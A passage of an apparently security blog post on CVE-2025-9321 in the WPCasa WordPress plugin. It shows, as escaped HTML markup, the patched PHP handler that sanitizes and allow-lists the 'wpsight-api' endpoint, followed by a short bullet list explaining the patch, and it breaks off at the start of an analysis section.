class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;3)&amp;ensp;Last&amp;ensp;resort:&amp;ensp;direct&amp;ensp;$_GET.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight-api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_text_field&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_unslash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight-api&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;No&amp;ensp;request&amp;ensp;found&amp;ensp;â†’&amp;ensp;exit&amp;ensp;early.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Sanitize&amp;ensp;to&amp;ensp;a&amp;ensp;valid&amp;ensp;key.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sanitize_key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$raw&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;sd&#34;&gt;/**&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&amp;ensp;Build&amp;ensp;allow-list&amp;ensp;of&amp;ensp;allowed&amp;ensp;API&amp;ensp;endpoints.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allowed&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;apply_filters&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight_api_allowed_endpoints&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;If&amp;ensp;API&amp;ensp;is&amp;ensp;not&amp;ensp;allowed,&amp;ensp;block&amp;ensp;access.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allowed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;wp_die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;sprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Endpoint&amp;ensp;&amp;#34;%s&amp;#34;&amp;ensp;not&amp;ensp;allowed.&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpcasa&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;esc_html__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Forbidden&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpcasa&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;response&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;mi&#34;&gt;403&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Start&amp;ensp;output&amp;ensp;buffering.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Optional:&amp;ensp;safe&amp;ensp;class&amp;ensp;instantiation&amp;ensp;if&amp;ensp;explicitly&amp;ensp;allowed.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;empty&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allowed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;class_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allowed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$allowed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;sd&#34;&gt;/**&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*&amp;ensp;Trigger&amp;ensp;API&amp;ensp;action&amp;ensp;hook.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;sd&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;*/&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;do_action&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpsight_api_&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$api&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;defined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;WP_DEBUG&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;WP_DEBUG&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_end_flush&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;ob_end_clean&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-28-cve-2025-9321/diff.png&#34; title=&#34;Patch changes&#34; data-thumbnail=&#34;/posts/2025-11-28-cve-2025-9321/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch changes&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-28-cve-2025-9321/diff.png&#39; alt=&#34;Diff&#34; height=&#34;975&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch changes&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Reads input with layered fallbacks: &lt;code&gt;get_query_var&lt;/code&gt; â†’ &lt;code&gt;$wp-&amp;gt;query_vars&lt;/code&gt; â†’ &lt;code&gt;$_GET&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Uses &lt;code&gt;sanitize_key&lt;/code&gt; for strict input control.&lt;/li&gt;&#xA;&lt;li&gt;Enforces an allowâ€‘list using &lt;code&gt;wpsight_api_allowed_endpoints&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Blocks all endpoints not explicitly allowed (403).&lt;/li&gt;&#xA;&lt;li&gt;Only instantiates classes if clearly defined in the allow-list.&lt;/li&gt;&#xA;&lt;li&gt;Improves safety and prevents unauthorized code execution.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 